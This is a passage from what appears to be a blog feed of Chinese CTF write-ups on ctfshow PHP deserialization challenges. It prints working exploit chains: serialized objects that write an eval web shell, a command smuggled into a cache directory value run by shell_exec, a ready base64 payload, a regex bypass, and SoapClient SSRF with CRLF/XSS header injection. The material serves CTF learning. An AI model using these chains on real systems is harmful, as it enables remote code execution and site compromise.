class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">conn</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">mysqli</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_mysql_host</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_mysql_username</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_mysql_password</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get_mysql_db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">conn</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_user_password_by_username</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select sds_password from sds_user where sds_username='\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$u</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"' order by id limit 1;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">conn</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token constant\">MYSQLI_BOTH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">num_rows</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'sds_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>当其 <code>__destruct</code>  时即可执行，但由于以其本身创建的 <code>$this-&gt;conn</code>  为 <code>mysqli</code>  对象，故需要想方法使其为 <code>log</code>  对象</p>\n<p>好在该文件 <code>require \"class.php\"</code> ，故可以构造时就使其为 <code>log</code>  对象</p>\n<p>而在 <code>index.php</code> ，又也 <code>require \"dao.php\"</code></p>\n<p>故代码为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dao</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$conn</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">conn</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">log</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$title</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$info</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dao</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">log</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>payload 为 <code>TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtOO3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</code></p>\n<p>填写 cookie 后，访问 <code>index.php</code> ，再访问 <code>1.php</code> ，得到报错<strong> Notice</strong>: Undefined offset: 1 in <strong>/var/www/html/1.php</strong> on line <strong>1</strong></p>\n<p><code>1=system('ls');</code>  后发现有 <code>flag.php</code> ， <code>1=system('tac flag.php');</code> ，得到 flag</p>\n<h1 id=\"web-307\"><a class=\"anchor\" href=\"#web-307\">#</a> web 307</h1>\n<p>查询反序列化路口，可以找到四个，其中三个只有反序列化，一个为反序列化后，并调用了其 <code>clearCache()</code>  方法</p>\n<p>查看所有的类，之前能用的 <code>__destruct</code>  中 <code>close()</code> ，由于 <code>log</code>  类的对应写文件方法为 <code>closelog()</code> ，故该方法失效，所以只能选用 <code>logout.php</code>  中的反序列化，调用 <code>clearCache()</code>  方法</p>\n<p>查看所有拥有 <code>clearCache()</code>  方法的类，为 <code>dao</code>  和 <code>service</code> ，而 <code>service</code>  最终调用的也为 <code>dao</code>  类中的 <code>clearCache()</code>  方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span>  <span class=\"token function-definition function\">clearCache</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'rm -rf ./'</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">cache_dir</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>故只需巧妙构造一个 <code>$this-&gt;config-&gt;cache_dir</code>  便可执行系统命令</p>\n<p>而对于 <code>config</code>  类</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">config</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'phpcj'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_db</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'sds'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_port</span><span class=\"token operator\">=</span><span class=\"token number\">3306</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_host</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$cache_dir</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'cache'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_mysql_username</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysql_username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_mysql_password</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysql_password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_mysql_port</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysql_port</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_mysql_db</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysql_db</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_mysql_host</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">mysql_host</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>只需修改 <code>public $cache_dir = 'cache';</code>  项</p>\n<p>故现在有两个选项，序列化 <code>dao</code>  和序列化 <code>service</code></p>\n<p>但由于 <code>service</code>  类存在 <code>__wakeup()</code>  方法，再进行反序列化操作前，会调用此方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">config</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">dao</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>也即此时的 <code>config</code>  和 <code>dao</code>  都会刷新，那么 <code>dao</code>  中的构造好的 <code>config</code>  也会刷新，从而丢失构造好的数据，故只能选用 <code>dao</code>  序列化</p>\n<p>代码如下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">config</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'phpcj'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_db</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'sds'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_port</span><span class=\"token operator\">=</span><span class=\"token number\">3306</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$mysql_host</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$cache_dir</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'x;echo \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\";echo '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">dao</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$config</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$conn</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">config</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">dao</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">config</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>访问 <code>controller/logout.php</code> ，自动跳转到 <code>login.php</code>  后，访问 <code>1.php</code> ，之后分别输入 <code>1=system('ls')</code>  和 <code>1=system('tac flag.php')</code>  得到 flag</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d3333ead/",
            "url": "http://dpm12345.cn/posts/d3333ead/",
            "title": "反序列化",
            "date_published": "2022-10-04T14:16:40.000Z",
            "content_html": "<h1 id=\"web-258\"><a class=\"anchor\" href=\"#web-258\">#</a> web 258</h1>\n<p>相比于上一题多了正则匹配： <code>if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))</code></p>\n<p>由构造的序列化字符串，只需将 <code>O:</code>  改为 <code>O:+</code>  即可</p>\n<h1 id=\"web-259\"><a class=\"anchor\" href=\"#web-259\">#</a> web 259</h1>\n<p>这个题利用的是 php 原生类 SoapClient<br>\n 该类的构造函数如下：</p>\n<p><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></p>\n<p>flag.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$xff</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>当然这是个不完整的源码，应该还有一条判断真实 ip 的也就是</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>xxxxxx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>所以首先得利用 <code>ssrf</code>  访问 <code>flag.php</code>  接着构造 post 数据 <code>token=ctfshow</code>  和请求头 <code>X-Forwarded-For</code>  就能把 flag 写到 flag.txt 中了。</p>\n<p>那么 ssrf 漏洞在哪呢，这就得用到我们前面提到的 SoapClient 类了。这个类中有个 <code>__call</code>  魔术方法（当调用不存在的方法时触发），会调用 SoapClient 类的构造方法。</p>\n<p>另外用到的一个文章识点就是 CRLF</p>\n<p>大概如下：</p>\n<p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是用两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话 Cookie 或者 HTML 代码</p>\n<p>就比如跳转网站，一般其跳转包为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>HTTP/1.1 302 Moved Temporarily </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Date: Fri, 27 Jun 2014 17:52:17 GMT </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Content-Type: text/html </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Content-Length: 154 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Connection: close </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Location: http://xxxx</pre></td></tr></tbody></table></figure><p>如果我们将 <code>http://xxxx</code>  修改为 <code>http://xxxx%0axxxx</code></p>\n<p>那么显然 <code>Location</code>  段会变为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>Location: http://xxxx</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>xxxx</pre></td></tr></tbody></table></figure><p>这样我们就可以以此来修改跳转包，比如 <code>Set-cookie</code> ，从而使得进入跳转网站自带 cookie</p>\n<p>同理，如果我们将 <code>%0a</code>  修改为 <code>%0d%0a%0d%0a</code> ，即两个 CRLF (换行)</p>\n<p>那么 <code>xxxx</code>  会进入 HTTP Body，即会显示，如果为 <code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>  那么会显示一张图片，并在错误时进行弹窗</p>\n<p>但由于浏览器的 XSS Filter，同时需要注入 <code>X-XSS-Protection:0</code> ，使得 <code>alert</code>  正常执行</p>\n<p>由此，我们利用 SoapClient 进行请求包的构造</p>\n<p>大致结构为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>Content-Type: text/html </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Content-Length: 154 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Location: http://127.0.0.1/flag</pre></td></tr><tr><td 